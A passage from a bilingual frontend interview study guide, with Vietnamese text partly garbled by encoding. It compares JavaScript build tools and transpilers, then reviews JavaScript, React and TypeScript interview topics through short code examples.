| **Speed** | â­â­ Baseline | â­â­â­â­â­ 20x faster |
| **Language** | JavaScript | Rust |
| **Plugin Ecosystem** | â­â­â­â­â­ Huge | â­â­â­ Growing |
| **Compatibility** | â­â­â­â­â­ Best | â­â­â­â­ Good |
| **Preset Support** | â­â­â­â­â­ Many | â­â­â­ Basic |
| **Maturity** | â­â­â­â­â­ 10y | â­â­â­ 4y |
| **Minification** | âŒ No | âœ… Yes |
| **TypeScript** | âœ… Via preset | âœ… Built-in |

---

#### **ğŸ”¹ A. Babel - The Standard**

**âœ… Strengths:**
1. **Plugin Ecosystem**: 1000+ plugins
2. **Presets**: @babel/preset-env, @babel/preset-react, etc.
3. **Compatibility**: Support old browsers (IE11)
4. **Customization**: Fine-grained control
5. **Stable**: Production-proven

**âŒ Weaknesses:**
1. **Slow**: JavaScript-based (single-threaded)
2. **Complex Config**: Many presets/plugins
3. **Large**: Increases build time significantly

**ğŸ”§ Example:**

```javascript
// babel.config.js
module.exports = {
  presets: [
    ['@babel/preset-env', {
      targets: '> 0.25%, not dead',
      useBuiltIns: 'usage',
      corejs: 3,
    }],
    '@babel/preset-react',
    '@babel/preset-typescript',
  ],
  plugins: [
    '@babel/plugin-proposal-class-properties',
    '@babel/plugin-proposal-optional-chaining',
  ],
};
```

---

#### **ğŸ”¹ B. SWC - The Speed Demon**

**âœ… Strengths:**
1. **20x Faster**: Rust-based, parallel processing
2. **Built-in Minification**: No need for Terser
3. **TypeScript Native**: No extra config
4. **Compatible**: Drop-in replacement for Babel
5. **Used by**: Next.js, Vite, Turbopack

**âŒ Weaknesses:**
1. **Smaller Ecosystem**: Fewer plugins
2. **Less Mature**: Newer, potential bugs
3. **Limited Presets**: Basic compared to Babel

**ğŸ”§ Example:**

```json
// .swcrc
{
  "jsc": {
    "parser": {
      "syntax": "typescript",
      "tsx": true
    },
    "transform": {
      "react": {
        "runtime": "automatic"
      }
    },
    "target": "es2020"
  },
  "module": {
    "type": "es6"
  },
  "minify": true
}
```

**â±ï¸ Performance:**
```
Transpile 1000 files:
- Babel: ~10 seconds
- SWC:   ~500ms âš¡âš¡âš¡ (20x faster!)
```

---

#### **3ï¸âƒ£ Decision Matrix - Khi NÃ o DÃ¹ng GÃ¬?**

```typescript
// =====================================
// BUILD TOOL SELECTION GUIDE
// =====================================

const selectBuildTool = (project: Project): BuildTool => {
  // 1. NEW PROJECT â†’ Vite
  if (project.isNew && project.framework !== 'Next.js') {
    return 'Vite'; // âš¡ Best DX, fast, modern
  }
  
  // 2. NEXT.JS â†’ Turbopack (experimental)
  if (project.framework === 'Next.js') {
    return 'Turbopack'; // ğŸš€ Native, fastest
  }
  
  // 3. LIBRARY â†’ Rollup
  if (project.type === 'library') {
    return 'Rollup'; // ğŸ“¦ Best tree-shaking, multiple outputs
  }
  
  // 4. LEGACY/ENTERPRISE â†’ Webpack
  if (project.hasLegacyCode || project.complexRequirements) {
    return 'Webpack'; // ğŸ—ï¸ Mature, configurable, plugins
  }
  
  // 5. CI/CD BUILD ONLY â†’ esbuild
  if (project.needsSpeed && !project.needsDevServer) {
    return 'esbuild'; // âš¡âš¡âš¡ Fastest builds
  }
  
  // Default: Vite
  return 'Vite';
};

// TRANSPILER SELECTION
const selectTranspiler = (project: Project): Transpiler => {
  // 1. SPEED CRITICAL â†’ SWC
  if (project.prioritizeSpeed) {
    return 'SWC'; // âš¡ 20x faster
  }
  
  // 2. OLD BROWSER SUPPORT â†’ Babel
  if (project.targets.includes('IE11')) {
    return 'Babel'; // ğŸŒ Best compatibility
  }
  
  // 3. COMPLEX TRANSFORMATIONS â†’ Babel
  if (project.needsCustomPlugins) {
    return 'Babel'; // ğŸ”Œ Huge ecosystem
  }
  
  // Default: SWC (modern projects)
  return 'SWC';
};
```

---

#### **4ï¸âƒ£ Real-World Benchmarks**

**ğŸ Build Time Comparison (Same Project):**

```
Project: React app (500 components, 2MB source)

DEV SERVER START:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Tool         â”‚ Time      â”‚ Comparison   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Webpack      â”‚ 10s       â”‚ Baseline     â”‚
â”‚ Rollup       â”‚ 8s        â”‚ 1.25x faster â”‚
â”‚ Vite         â”‚ 500ms     â”‚ 20x faster âš¡â”‚
â”‚ esbuild      â”‚ 300ms     â”‚ 33x faster âš¡â”‚
â”‚ Turbopack    â”‚ 1s        â”‚ 10x faster âš¡â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

PRODUCTION BUILD:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Tool         â”‚ Time      â”‚ Bundle Size  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Webpack      â”‚ 30s       â”‚ 500KB        â”‚
â”‚ Rollup       â”‚ 15s       â”‚ 450KB âœ…      â”‚
â”‚ Vite         â”‚ 10s       â”‚ 460KB        â”‚
â”‚ esbuild      â”‚ 2s âš¡      â”‚ 470KB        â”‚
â”‚ Turbopack    â”‚ 5s        â”‚ 460KB        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

HMR (Hot Module Replacement):
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Tool         â”‚ Update    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Webpack      â”‚ 1-2s      â”‚
â”‚ Vite         â”‚ 50ms âš¡    â”‚
â”‚ Turbopack    â”‚ 50ms âš¡    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

#### **5ï¸âƒ£ Migration Guide**

**ğŸ”„ Webpack â†’ Vite:**

```typescript
// 1. Install Vite
npm install vite @vitejs/plugin-react

// 2. Create vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  
  // Migrate Webpack aliases
  resolve: {
    alias: {
      '@': '/src',
    },
  },
  
  // Migrate Webpack env vars
  define: {
    'process.env': {},
  },
});

// 3. Update index.html
// Move from public/ to root
// Change <script src="/src/index.tsx" type="module">

// 4. Update package.json
{
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview"
  }
}

// 5. Replace Webpack-specific code
// - require() â†’ import
// - require.context() â†’ import.meta.glob()
// - process.env â†’ import.meta.env
```

**ğŸ”„ Babel â†’ SWC:**

```bash
# 1. Install SWC
npm install @swc/core @swc/cli

# 2. Create .swcrc (see example above)

# 3. Update build scripts
# package.json
{
  "scripts": {
    "build": "swc src -d dist"
  }
}

# 4. Update bundler config
# If using Webpack
{
  test: /\.(ts|tsx)$/,
  use: {
    loader: 'swc-loader',
  },
}

# If using Vite (already uses esbuild, but can switch)
# vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react-swc'; // SWC version

export default defineConfig({
  plugins: [react()],
});
```

---

#### **ğŸ”¥ Best Practices**

**âœ… DO:**
1. **Choose based on needs**:
   - New project â†’ Vite
   - Library â†’ Rollup
   - Legacy â†’ Webpack
   - Next.js â†’ Turbopack

2. **Use SWC for transpilation** (unless need Babel plugins)

3. **Enable caching**:
   ```javascript
   // Webpack
   cache: {
     type: 'filesystem',
   }
   
   // Vite (auto-cached)
   ```

4. **Monitor bundle size**:
   ```bash
   npm install -D webpack-bundle-analyzer
   ```

5. **Use source maps in production**:
   ```javascript
   build: {
     sourcemap: true, // Debug production issues
   }
   ```

**âŒ DON'T:**
1. **Over-configure**: Keep config simple
2. **Ignore warnings**: Fix deprecations early
3. **Skip optimization**: Enable minification, tree-shaking
4. **Mix tools**: Don't use Webpack + Vite together
5. **Forget to update**: Keep tools updated

---

#### **ğŸ¯ Káº¿t Luáº­n**

**Recommendation Matrix:**

| Scenario | Bundler | Transpiler | Reason |
|----------|---------|------------|--------|
| **New React/Vue app** | Vite | SWC | Fast DX, modern |
| **Next.js app** | Turbopack | SWC | Native integration |
| **Library/Package** | Rollup | SWC | Small bundles |
| **Legacy enterprise** | Webpack | Babel | Compatibility |
| **CI/CD builds** | esbuild | SWC | Speed |

**ğŸ’¡ Key Takeaways:**

1. **Vite is the new standard** for modern web apps (React, Vue, Svelte)
2. **Webpack still relevant** for complex/legacy projects
3. **Rollup best for libraries** (tree-shaking, multiple outputs)
4. **esbuild = speed** (use as build step, not full bundler)
5. **Turbopack = future** (Next.js only for now)
6. **SWC replacing Babel** (20x faster, same features)

**ğŸš€ Future Trends:**
- Rust-based tools (SWC, Turbopack) gaining traction
- Native ESM everywhere (no bundling in dev)
- Build tools merging (Vite uses Rollup + esbuild)
- Zero-config becoming standard

---


---

# ğŸ¯ **Tá»”NG Káº¾T CHO PHá»NG Váº¤N SENIOR FRONTEND DEVELOPER**

> **Má»¥c tiÃªu:** HÆ°á»›ng dáº«n tráº£ lá»i 66 cÃ¢u há»i trÃªn vá»›i tÆ° duy **Senior-level**, thá»ƒ hiá»‡n kinh nghiá»‡m thá»±c táº¿ vÃ  kháº£ nÄƒng giáº£i quyáº¿t váº¥n Ä‘á» phá»©c táº¡p.

---

## **ğŸ“š I. Tá»”NG Há»¢P KIáº¾N THá»¨C THEO CHá»¦ Äá»€**

> **Quick Reference Guide** - Ã”n táº­p nhanh 66 cÃ¢u há»i theo nhÃ³m kiáº¿n thá»©c

---

### **ğŸ¯ 1. JAVASCRIPT CORE FUNDAMENTALS**

#### **1.1. Data Types & Type System (Q1-Q3)**

**Q1: Primitive vs Reference Types**
```typescript
// 7 Primitive types (immutable, stored in Stack)
string, number, boolean, null, undefined, symbol, bigint

// Reference types (mutable, stored in Heap)
Object, Array, Function, Date, RegExp, Map, Set

// Key difference: Passing behavior
let a = { x: 1 };
let b = a;        // b references SAME object
b.x = 2;          // a.x = 2 (both changed)

// Clone: Shallow vs Deep
const shallow = { ...obj };              // Only 1 level
const deep = structuredClone(obj);       // All levels (modern)
const deep2 = JSON.parse(JSON.stringify(obj)); // No functions/dates
```

**Q2: Type Coercion**
```typescript
// Implicit coercion (JavaScript tá»± Ä‘á»™ng convert)
'5' + 3        // '53' (number â†’ string)
'5' - 3        // 2 (string â†’ number)
true + 1       // 2 (boolean â†’ number)
[] + []        // '' (array â†’ string)
{} + []        // 0 (object â†’ primitive)

// Explicit coercion (developer control)
Number('123')  // 123
String(123)    // '123'
Boolean(0)     // false

// Falsy values (8 giÃ¡ trá»‹)
false, 0, -0, 0n, '', null, undefined, NaN

// Truthy: Everything else (including [], {}, '0', 'false')
```

**Q3: == vs ===**
```typescript
// == (Abstract Equality - cÃ³ type coercion)
5 == '5'       // true (string â†’ number)
null == undefined  // true (special case)
0 == false     // true (boolean â†’ number)

// === (Strict Equality - NO coercion)
5 === '5'      // false
null === undefined  // false

// Senior rule: ALWAYS use ===, except for null/undefined check
if (value == null) // Checks both null AND undefined
```

**Interview Tip:**
> "TÃ´i luÃ´n dÃ¹ng `===` Ä‘á»ƒ trÃ¡nh unexpected coercion. Chá»‰ dÃ¹ng `==` khi check `null/undefined` cÃ¹ng lÃºc. Team tÃ´i enforce báº±ng ESLint rule `eqeqeq`."

---

#### **1.2. Execution Context & Scope (Q4-Q6)**

**Q4: Event Loop (CRITICAL)**
```typescript
// Execution order (priority):
1. Call Stack (synchronous code)
2. Microtask Queue (high priority)
   - Promise.then/catch/finally
   - queueMicrotask()
   - MutationObserver
3. Macrotask Queue (low priority)
   - setTimeout/setInterval
   - setImmediate (Node.js)
   - I/O operations

// Example timing:
console.log('1');                    // 1 - Stack
setTimeout(() => console.log('2'));  // 4 - Macrotask
Promise.resolve().then(() => console.log('3')); // 3 - Microtask
console.log('4');                    // 2 - Stack
// Output: 1, 4, 3, 2

// Real-world impact:
// âŒ setTimeout(fn, 0) - delay 4-10ms (macrotask)
// âœ… Promise.resolve().then(fn) - <1ms (microtask)
```

**Q5: Closures**
```typescript
// Closure = Function + Lexical Environment
function outer() {
  let count = 0; // Private variable
  return function inner() {
    count++;
    return count;
  }
}
const counter = outer();
counter(); // 1
counter(); // 2 (closure remembers count)

// Use cases:
1. Data privacy (module pattern)
2. Function factories (createMultiplier)
3. Event handlers (preserve state)
4. Currying (partial application)

// Memory leak warning:
element.addEventListener('click', function handler() {
  // Closure keeps reference to element â†’ leak if not removed
});
// Fix: element.removeEventListener('click', handler);
```

**Q6: Hoisting & Temporal Dead Zone**
```typescript
// var: Hoisted, initialized with undefined
console.log(x); // undefined
var x = 5;

// let/const: Hoisted, NOT initialized (TDZ)
console.log(y); // ReferenceError: Cannot access before initialization
let y = 5;

// Function hoisting:
foo(); // Works (function declaration hoisted)
function foo() {}

bar(); // TypeError (var hoisted, but undefined)
var bar = function() {};

// Senior practice: ALWAYS use const/let (block-scoped, TDZ prevents bugs)
```

---

#### **1.3. ES6+ Features (Q7-Q10, Q12-Q13)**

**Q7: Spread/Rest Operators**
```typescript
// Spread (...) - Expand iterables
const arr = [1, 2, 3];
const newArr = [...arr, 4, 5]; // [1,2,3,4,5]
const merged = [...arr1, ...arr2];

const obj = { a: 1, b: 2 };
const newObj = { ...obj, c: 3 }; // Shallow copy

// Rest (...) - Collect into array
function sum(...numbers) { // numbers = array of arguments
  return numbers.reduce((a, b) => a + b);
}
sum(1, 2, 3, 4); // 10

const [first, ...rest] = [1, 2, 3, 4];
// first = 1, rest = [2, 3, 4]
```

**Q8: Destructuring**
```typescript
// Array destructuring
const [a, b, ...rest] = [1, 2, 3, 4];
const [x = 0, y = 0] = []; // Default values

// Object destructuring
const { name, age } = user;
const { name: userName } = user; // Rename
const { address: { city } } = user; // Nested
const { role = 'guest' } = user; // Default

// Function parameters
function greet({ name, age = 18 }) {
  console.log(`${name} is ${age}`);
}
```

**Q9: Template Literals**
```typescript
// String interpolation
const name = 'Alice';
const greeting = `Hello, ${name}!`;

// Multi-line strings
const html = `
  <div>
    <h1>${title}</h1>
  </div>
`;

// Tagged templates (advanced)
function highlight(strings, ...values) {
  return strings.reduce((result, str, i) => 
    result + str + (values[i] ? `<mark>${values[i]}</mark>` : '')
  , '');
}
const message = highlight`Hello ${name}, you have ${count} messages`;
```

**Q12: Optional Chaining & Nullish Coalescing**
```typescript
// Optional chaining (?.) - Safe property access
const city = user?.address?.city; // undefined if any is null/undefined
const firstItem = arr?.[0];
const result = obj?.method?.();

// Nullish coalescing (??) - Default for null/undefined only
const value = userInput ?? 'default'; // NOT 0, '', false

// vs OR operator:
0 || 'default'  // 'default' (0 is falsy)
0 ?? 'default'  // 0 (0 is not null/undefined)

// Real-world:
const port = process.env.PORT ?? 3000; // Port 0 is valid
```

---

#### **1.4. Functions & this Binding (Q11)**

**Q11: Arrow Functions vs Regular Functions (CRITICAL)**
```typescript
// Key differences:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Feature             â”‚ Arrow (=>) â”‚ Regular (function) â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ this binding        â”‚ Lexical (parent) â”‚ Dynamic (caller)â”‚
â”‚ Can be constructor  â”‚ âŒ No            â”‚ âœ… Yes          â”‚
â”‚ arguments object    â”‚ âŒ No            â”‚ âœ… Yes          â”‚
â”‚ Can be method       â”‚ âš ï¸ No (this bug) â”‚ âœ… Yes          â”‚
â”‚ Implicit return     â”‚ âœ… Yes (1-liner) â”‚ âŒ No           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

// Use arrow when: Callbacks, closures, short functions
const doubled = arr.map(x => x * 2);
setTimeout(() => this.setState(...), 1000); // Preserves this

// Use regular when: Methods, constructors, need arguments/this
const obj = {
  name: 'Alice',
  greet: function() { // NOT arrow
    console.log(`Hello, ${this.name}`);
  }
};

// this binding rules (priority order):
1. new binding - new Foo() â†’ this = new object
2. Explicit - call/apply/bind â†’ this = specified object
3. Implicit - obj.method() â†’ this = obj
4. Default - standalone function â†’ this = undefined (strict) / window
5. Arrow - this = lexical parent
```

---

#### **1.5. Asynchronous JavaScript (Q14)**

**Q14: Promises & async/await (CRITICAL)**
```typescript
// Promise states: pending â†’ fulfilled / rejected
const promise = new Promise((resolve, reject) => {
  if (success) resolve(data);
  else reject(error);
});

// Chaining
fetch('/api')
  .then(res => res.json())
  .then(data => process(data))
  .catch(err => handleError(err))
  .finally(() => cleanup());

// async/await (syntactic sugar)
async function fetchData() {
  try {
    const res = await fetch('/api');
    const data = await res.json();
    return data;
  } catch (err) {
    handleError(err);
  }
}

// Concurrent operations:
// âŒ Sequential (slow)
const user = await fetchUser();
const posts = await fetchPosts(); // Waits for user

// âœ… Parallel (fast)
const [user, posts] = await Promise.all([
  fetchUser(),
  fetchPosts()
]); // Both run simultaneously

// Promise utilities:
Promise.all([p1, p2])      // Wait all, fail if any fails
Promise.allSettled([p1, p2]) // Wait all, never fails
Promise.race([p1, p2])     // First to settle (win or fail)
Promise.any([p1, p2])      // First to fulfill (ignore failures)
```

---

### **ğŸ¨ 2. REACT ECOSYSTEM**

#### **2.1. Core Concepts (Q15-Q21)**

**Q15-Q16: Virtual DOM & Reconciliation**
```typescript
// Virtual DOM = Lightweight JS object representation of real DOM
const vdom = {
  type: 'div',
  props: { className: 'container' },
  children: [
    { type: 'h1', props: {}, children: 'Title' }
  ]
};

// Reconciliation = Diffing algorithm to update efficiently
1. Compare element type (div â†’ span = full replace)
2. Compare props (className changed = update)
3. Compare children (key-based matching)

// Key importance:
// âŒ Without key - React re-renders all items
{items.map(item => <Item data={item} />)}

// âœ… With key - React updates only changed items
{items.map(item => <Item key={item.id} data={item} />)}

// key rules:
- Stable (not index if list can reorder)
- Unique among siblings
- Never changes (not random)
```

**Q17-Q18: Events & Lifecycle**
```typescript
// React events = Synthetic Events (cross-browser compatible)
<button onClick={handleClick}>Click</button>

// Event pooling (removed in React 17+)
// Before: event.persist() needed for async access

// Lifecycle (Class components):
componentDidMount()     // After first render
componentDidUpdate()    // After re-renders
componentWillUnmount()  // Cleanup

// Lifecycle (Hooks):
useEffect(() => {
  // componentDidMount + componentDidUpdate
  return () => {
    // componentWillUnmount
  };
}, [deps]); // Only re-run if deps change
```

**Q19-Q21: Controlled Components & Lists**
```typescript
// Controlled component - React controls value
const [value, setValue] = useState('');
<input 
  value={value} 
  onChange={e => setValue(e.target.value)} 
/>

// Uncontrolled - DOM controls value (use ref)
const inputRef = useRef();
<input ref={inputRef} />
const value = inputRef.current.value;

// When to use each:
Controlled: Form validation, conditional rendering, formatted input
Uncontrolled: File uploads, integrating non-React libraries, simple forms
```

---

#### **2.2. Performance Optimization (Q22 - CRITICAL)**

**Q22: React Performance Techniques**
```typescript
// 1. Memoization
// React.memo - Prevent re-render if props unchanged
const ExpensiveComponent = React.memo(({ data }) => {
  return <div>{/* Heavy rendering */}</div>;
});

// useMemo - Cache expensive calculations
const sortedData = useMemo(() => {
  return data.sort((a, b) => a.value - b.value);
}, [data]); // Only re-sort when data changes

// useCallback - Cache function reference
const handleClick = useCallback(() => {
  setCount(c => c + 1);
}, []); // Function identity stable across re-renders

// 2. Code Splitting
const HeavyComponent = React.lazy(() => import('./Heavy'));
<Suspense fallback={<Spinner />}>
  <HeavyComponent />
</Suspense>

// 3. Virtualization (Large lists)
import { FixedSizeList } from 'react-window';
<FixedSizeList
  height={600}
  itemCount={10000}
  itemSize={50}
>
  {({ index, style }) => <Row style={style} data={items[index]} />}
</FixedSizeList>

// 4. Debouncing/Throttling
const debouncedSearch = useMemo(
  () => debounce((query) => search(query), 300),
  []
);

// Performance metrics to track:
- First Contentful Paint (FCP) < 1.8s
- Time to Interactive (TTI) < 3.8s
- Bundle size < 200KB (initial)
```

---

#### **2.3. State Management (Q23 - CRITICAL)**

**Q23: Redux vs Zustand vs Jotai vs Context**
```typescript
// 1. Redux - Predictable state container
// Pros: DevTools, middleware, time-travel debugging
// Cons: Boilerplate, learning curve
// Use when: Large app, complex state, need debugging tools

import { createSlice, configureStore } from '@reduxjs/toolkit';
const counterSlice = createSlice({
  name: 'counter',
  initialState: { value: 0 },
  reducers: {
    increment: state => { state.value += 1; }
  }
});

// 2. Zustand - Minimal boilerplate
// Pros: Simple API, no context, TypeScript-friendly
// Cons: Less tooling, no built-in devtools
// Use when: Medium app, want simplicity, TypeScript project

import create from 'zustand';
const useStore = create(set => ({
  count: 0,
  increment: () => set(state => ({ count: state.count + 1 }))
}));

// 3. Jotai - Atomic state
// Pros: Fine-grained updates, React Suspense support
// Cons: New paradigm, smaller ecosystem
// Use when: Want atomic updates, working with Suspense

import { atom, useAtom } from 'jotai';
const countAtom = atom(0);
const [count, setCount] = useAtom(countAtom);

// 4. Context API - Built-in React
// Pros: No library, simple for small state
// Cons: Re-render performance issues, no devtools
// Use when: Theme, auth, locale (infrequent updates)

const ThemeContext = createContext();
<ThemeContext.Provider value={theme}>
  {children}
</ThemeContext.Provider>

// Decision tree:
Large app + complex state â†’ Redux Toolkit
Medium app + TypeScript â†’ Zustand
Atomic updates + Suspense â†’ Jotai
Small state (theme, auth) â†’ Context
```

---

#### **2.4. Advanced Patterns (Q24-Q30)**

**Q24: Context API Deep Dive**
```typescript
// Provider pattern
const UserContext = createContext();

function UserProvider({ children }) {
  const [user, setUser] = useState(null);
  const value = useMemo(() => ({ user, setUser }), [user]);
  
  return (
    <UserContext.Provider value={value}>
      {children}
    </UserContext.Provider>
  );
}

// Consumer hook
function useUser() {
  const context = useContext(UserContext);
  if (!context) throw new Error('useUser must be within UserProvider');
  return context;
}

// Performance optimization: Split contexts
// âŒ One context for all â†’ re-renders everything
<AppContext.Provider value={{ user, theme, settings }}>

// âœ… Multiple contexts â†’ granular updates
<UserContext.Provider value={user}>
  <ThemeContext.Provider value={theme}>
    <SettingsContext.Provider value={settings}>
```

**Q26: React Hooks (CRITICAL)**
```typescript
// Hooks rules:
1. Only call at top level (not in loops/conditions)
2. Only call from React functions (not regular JS)

// Common hooks:
useState    // Local state
useEffect   // Side effects, lifecycle
useContext  // Consume context
useRef      // Mutable ref, DOM access
useMemo     // Cache computed values
useCallback // Cache functions
useReducer  // Complex state logic

// Custom hooks - Extract reusable logic
function useLocalStorage(key, initialValue) {
  const [value, setValue] = useState(() => {
    const stored = localStorage.getItem(key);
    return stored ? JSON.parse(stored) : initialValue;
  });
  
  useEffect(() => {
    localStorage.setItem(key, JSON.stringify(value));
  }, [key, value]);
  
  return [value, setValue];
}

// useEffect cleanup - CRITICAL for avoiding leaks
useEffect(() => {
  const subscription = subscribe();
  const timer = setInterval(() => {}, 1000);
  
  return () => {
    subscription.unsubscribe(); // Cleanup
    clearInterval(timer);
  };
}, []);
```

**Q27-Q28: Error Boundaries & Code Splitting**
```typescript
// Error Boundary - Catch React render errors
class ErrorBoundary extends React.Component {
  state = { hasError: false };
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
    logErrorToService(error, errorInfo);
  }
  
  render() {
    if (this.state.hasError) {
      return <ErrorFallback />;
    }
    return this.props.children;
  }
}

// Usage:
<ErrorBoundary>
  <App />
</ErrorBoundary>

// Code Splitting strategies:
1. Route-based (most common)
const Home = lazy(() => import('./Home'));
const About = lazy(() => import('./About'));

2. Component-based (heavy components)
const Chart = lazy(() => import('./Chart'));

3. Library-based (moment.js, lodash)
import('moment').then(moment => {});
```

**Q31: SSR vs CSR vs SSG vs ISR**
```typescript
// CSR (Client-Side Rendering)
// Pros: Interactive, cheap hosting
// Cons: SEO poor, slow FCP
// Use: Dashboard, admin panel (auth-required)

// SSR (Server-Side Rendering)
// Pros: SEO, fast FCP
// Cons: Expensive server, slow TTFB
// Use: E-commerce, news site (dynamic content)

// SSG (Static Site Generation)
// Pros: Fast, cheap, SEO
// Cons: Build time, stale data
// Use: Blog, docs, marketing (static content)

// ISR (Incremental Static Regeneration)
// Pros: Fast + fresh data, SEO
// Cons: Next.js only, complexity
// Use: E-commerce product pages (revalidate hourly)

// Next.js implementation:
export async function getServerSideProps() {
  // SSR - Runs on every request
}

export async function getStaticProps() {
  // SSG - Runs at build time
  return { revalidate: 60 }; // ISR - Revalidate every 60s
}
```

---

### **âš¡ 3. TYPESCRIPT**

#### **3.1. Type System Basics (Q32-Q37)**

**Q32-Q34: Basic Types & Interfaces**
```typescript
// Primitive types
let age: number = 25;
let name: string = 'Alice';
let isActive: boolean = true;

// Arrays
let numbers: number[] = [1, 2, 3];
let names: Array<string> = ['a', 'b'];

// Tuples (fixed-length, typed arrays)
let tuple: [string, number] = ['age', 25];

// Enums
enum Status { Pending, Active, Completed }
let status: Status = Status.Active;

// Union types
let id: string | number = 123;

// Intersection types
type A = { a: number };
type B = { b: string };
type C = A & B; // { a: number, b: string }

// Interfaces vs Type aliases
interface User {
  name: string;
  age: number;
}

type User = {
  name: string;
  age: number;
};

// When to use:
Interface: Object shapes, can extend/implement
Type: Unions, intersections, primitives, tuples
```

**Q35: Type Guards**
```typescript
// typeof guard (primitives)
function print(value: string | number) {
  if (typeof value === 'string') {
    console.log(value.toUpperCase()); // TS knows it's string
  }
}

// instanceof guard (classes)
if (error instanceof CustomError) {
  console.log(error.customProperty);
}

// in guard (properties)
if ('swim' in animal) {
  animal.swim(); // Has swim method
}

// Custom type guard
function isUser(obj: any): obj is User {
  return 'name' in obj && 'age' in obj;
}

if (isUser(data)) {
  console.log(data.name); // TS knows it's User
}
```

**Q36: Generics**
```typescript
// Generic function
function identity<T>(value: T): T {
  return value;
}
identity<string>('hello'); // T = string
identity(123); // T inferred as number

// Generic interface
interface ApiResponse<T> {
  data: T;
  status: number;
}
const response: ApiResponse<User> = {
  data: { name: 'Alice', age: 25 },
  status: 200
};

// Generic constraints
function getProperty<T, K extends keyof T>(obj: T, key: K) {
  return obj[key]; // K must be key of T
}

// Real-world: Type-safe API client
class ApiClient<T> {
  async get(url: string): Promise<T> {
    const res = await fetch(url);
    return res.json();
  }
}
const userApi = new ApiClient<User>();
const user = await userApi.get('/api/users/1'); // user is User type
```

**Q37: any vs unknown vs never**
```typescript
// any - Disable type checking (avoid!)
let value: any = 'hello';
value.anything(); // No error, unsafe

// unknown - Type-safe any
let value: unknown = 'hello';
value.toUpperCase(); // âŒ Error
if (typeof value === 'string') {
  value.toUpperCase(); // âœ… OK after check
}

// never - Impossible values
function throwError(message: string): never {
  throw new Error(message); // Never returns
}

function exhaustiveCheck(value: never): never {
  throw new Error(`Unhandled case: ${value}`);
}

// Use case: Exhaustive switch
type Shape = Circle | Square;
function getArea(shape: Shape) {
  switch (shape.kind) {
    case 'circle': return Math.PI * shape.radius ** 2;
    case 'square': return shape.side ** 2;
    default: return exhaustiveCheck(shape); // TS error if case missing
  }
}
```

---

#### **3.2. Advanced Types (Q49 - CRITICAL)**

**Q49: TypeScript Advanced Patterns**
```typescript
// 1. Utility Types
type User = { id: number; name: string; email: string; password: string };

Partial<User>       // All properties optional
Required<User>      // All properties required
Readonly<User>      // All properties readonly
Pick<User, 'id' | 'name'>  // Select properties
Omit<User, 'password'>     // Exclude properties
Record<string, number>     // Object with string keys, number values
Exclude<T, U>       // Remove types from union
Extract<T, U>       // Extract types from union
NonNullable<T>      // Remove null/undefined
ReturnType<typeof fn>  // Get function return type
Parameters<typeof fn>  // Get function parameters

// 2. Mapped Types
type Optional<T> = {
  [P in keyof T]?: T[P];
};

type Nullable<T> = {
  [P in keyof T]: T[P] | null;
};

// 3. Conditional Types
